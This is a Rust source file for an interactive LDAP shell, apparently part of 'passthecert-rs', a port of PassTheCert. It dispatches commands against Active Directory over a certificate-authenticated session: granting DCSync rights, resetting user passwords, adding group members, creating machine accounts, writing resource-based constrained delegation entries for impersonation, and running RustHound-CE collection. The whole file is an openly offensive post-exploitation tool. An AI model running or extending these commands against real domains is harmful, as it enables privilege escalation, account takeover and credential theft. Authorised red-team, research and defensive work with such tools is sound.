//! Interactive LDAP shell over the certificate-authenticated session.
//!
//! Exposes every action of the tool as a shell command, in the spirit of
//! PassTheCert's ldap-shell. Each command builds an `Options` on the fly from
//! the base connection options plus the arguments typed on the line, then calls
//! the matching action module.

use std::io::{self, Write};

use anyhow::Result;
use ldap3::{Ldap, Scope, SearchEntry};
use log::warn;

use crate::actions::{account, add_computer, group, modify_user, rbcd, rusthound_ce, whoami};
use crate::args::Options;

pub async fn run(ldap: &mut Ldap, base_opts: &Options) -> Result<()> {
    println!("passthecert-rs ldap-shell. type 'help' for commands, 'exit' to quit.");
    loop {
        print!("# ");
        io::stdout().flush().ok();

        let mut line = String::new();
        if io::stdin().read_line(&mut line)? == 0 {
            break; // EOF (Ctrl-D)
        }
        let line = line.trim();
        if line.is_empty() {
            continue;
        }

        let args: Vec<&str> = line.split_whitespace().collect();
        let cmd = args[0];
        let rest = &args[1..];

        // Each command dispatches to an action; errors are printed, never fatal.
        let result: Result<()> = match cmd {
            "exit" | "quit" => break,
            "help" => { print_help(); Ok(()) }

            // Read-only
            "whoami" => whoami::run(ldap).await.map(|_| ()),
            "search" => { do_search(ldap, rest).await; Ok(()) }
            "dn" => {
                if rest.is_empty() { println!("usage: dn <baseDN>"); Ok(()) }
                else { do_search(ldap, &[rest[0], "(objectClass=*)"]).await; Ok(()) }
            }

            // Group membership: add_member <user> <group> / del_member <user> <group>
            "add_member" => run_group(ldap, base_opts, rest, true).await,
            "del_member" | "remove_member" => run_group(ldap, base_opts, rest, false).await,

            // Account status: enable <user> / disable <user>
            "enable" | "enable_account" => run_account(ldap, base_opts, rest, true).await,
            "disable" | "disable_account" => run_account(ldap, base_opts, rest, false).await,

            // User: passwd <user> [newpass] / elevate <user>
            "passwd" | "reset_password" => run_passwd(ldap, base_opts, rest).await,
            "elevate" | "dcsync" => run_elevate(ldap, base_opts, rest).await,

            // Computer: add_computer <name$> [password] / del_computer <name$>
            "add_computer" => run_add_computer(ldap, base_opts, rest).await,
            "del_computer" => run_del_computer(ldap, base_opts, rest).await,

            // RBCD: read_rbcd <target$> / write_rbcd <target$> <from$> /
            //       remove_rbcd <target$> <from$> / flush_rbcd <target$>
            "read_rbcd" => run_rbcd(ldap, base_opts, rest, "read").await,
            "write_rbcd" => run_rbcd(ldap, base_opts, rest, "write").await,
            "remove_rbcd" => run_rbcd(ldap, base_opts, rest, "remove").await,
            "flush_rbcd" => run_rbcd(ldap, base_opts, rest, "flush").await,

            // RustHound-CE: full collection into the current directory, zipped
            "rusthound" | "rusthound_ce" => rusthound_ce::run(ldap, base_opts).await,

            other => { println!("unknown command '{other}' (try 'help')"); Ok(()) }
        };

        if let Err(e) = result {
            warn!("{e}");
        }
    }
    Ok(())
}

// Helpers that build a per-command Options from the base connection options.

fn with(base: &Options) -> Options {
    base.clone()
}

async fn run_group(ldap: &mut Ldap, base: &Options, a: &[&str], add: bool) -> Result<()> {
    if a.len() < 2 {
        println!("usage: {} <user> <group>", if add { "add_member" } else { "del_member" });
        return Ok(());
    }
    let mut o = with(base);
    o.target = Some(a[0].to_string());
    o.group = Some(a[1..].join(" ")); // allow group names with spaces
    if add { group::add_member(ldap, &o).await } else { group::remove_member(ldap, &o).await }
}

async fn run_account(ldap: &mut Ldap, base: &Options, a: &[&str], enable: bool) -> Result<()> {
    if a.is_empty() {
        println!("usage: {} <user>", if enable { "enable" } else { "disable" });
        return Ok(());
    }
    let mut o = with(base);
    o.target = Some(a[0].to_string());
    if enable { account::enable(ldap, &o).await } else { account::disable(ldap, &o).await }
}

async fn run_passwd(ldap: &mut Ldap, base: &Options, a: &[&str]) -> Result<()> {
    if a.is_empty() {
        println!("usage: passwd <user> [newpassword]");
        return Ok(());
    }
    let mut o = with(base);
    o.target = Some(a[0].to_string());
    o.new_pass = a.get(1).map(|s| s.to_string());
    modify_user::change_password(ldap, &o).await
}

async fn run_elevate(ldap: &mut Ldap, base: &Options, a: &[&str]) -> Result<()> {
    if a.is_empty() {
        println!("usage: elevate <user>   (grant DCSync)");
        return Ok(());
    }
    let mut o = with(base);
    o.target = Some(a[0].to_string());
    o.elevate = true;
    modify_user::elevate(ldap, &o).await
}

async fn run_add_computer(ldap: &mut Ldap, base: &Options, a: &[&str]) -> Result<()> {
    let mut o = with(base);
    o.computer_name = a.first().map(|s| s.to_string());
    o.computer_pass = a.get(1).map(|s| s.to_string());
    add_computer::run(ldap, &o).await
}

async fn run_del_computer(ldap: &mut Ldap, base: &Options, a: &[&str]) -> Result<()> {
    if a.is_empty() {
        println!("usage: del_computer <name$>");
        return Ok(());
    }
    let mut o = with(base);
    o.computer_name = Some(a[0].to_string());
    add_computer::del_computer(ldap, &o).await
}

async fn run_rbcd(ldap: &mut Ldap, base: &Options, a: &[&str], op: &str) -> Result<()> {
    if a.is_empty() {
        println!("usage: {op}_rbcd <target$> [from$]");
        return Ok(());
    }
    let mut o = with(base);
    o.delegate_to = Some(a[0].to_string());
    o.delegate_from = a.get(1).map(|s| s.to_string());
    match op {
        "read" => rbcd::read(ldap, &o).await,
        "write" => rbcd::write(ldap, &o).await,
        "remove" => rbcd::remove(ldap, &o).await,
        "flush" => rbcd::flush(ldap, &o).await,
        _ => Ok(()),
    }
}

async fn do_search(ldap: &mut Ldap, a: &[&str]) {
    if a.is_empty() {
        println!("usage: search <baseDN> [filter]");
        return;
    }
    let base = a[0];
    let filter = if a.len() > 1 { a[1] } else { "(objectClass=*)" };
    match ldap.search(base, Scope::Subtree, filter, vec!["dn"]).await {
        Ok(res) => match res.success() {
            Ok((entries, _)) => {
                println!("{} entrie(s):", entries.len());
                for e in entries {
                    println!("  {}", SearchEntry::construct(e).dn);
                }
            }
            Err(e) => warn!("search error: {e}"),
        },
        Err(e) => warn!("search failed: {e}"),
    }
}

fn print_help() {
    println!(
        "commands:\n\
         \x20 whoami                          show the mapped identity\n\
         \x20 search <baseDN> [filter]        subtree search, prints DNs\n\
         \x20 dn <baseDN>                     search <baseDN> (objectClass=*)\n\
         \x20 add_member <user> <group>       add user/computer to a group\n\
         \x20 del_member <user> <group>       remove user/computer from a group\n\
         \x20 enable <user>                   enable an account (clear ACCOUNTDISABLE)\n\
         \x20 disable <user>                  disable an account (set ACCOUNTDISABLE)\n\
         \x20 passwd <user> [newpass]         reset a user's password\n\
         \x20 elevate <user>                  grant the user DCSync rights\n\
         \x20 add_computer [name$] [pass]     create a machine account\n\
         \x20 del_computer <name$>            delete a machine account\n\
         \x20 read_rbcd <target$>             list RBCD entries on target\n\
         \x20 write_rbcd <target$> <from$>    allow from$ to impersonate on target$\n\
         \x20 remove_rbcd <target$> <from$>   remove one RBCD entry\n\
         \x20 flush_rbcd <target$>            clear all RBCD entries\n\
         \x20 rusthound_ce                    run a full RustHound-CE collection (current dir, zipped)\n\
         \x20 help                            this help\n\
         \x20 exit | quit                     leave"
    );
}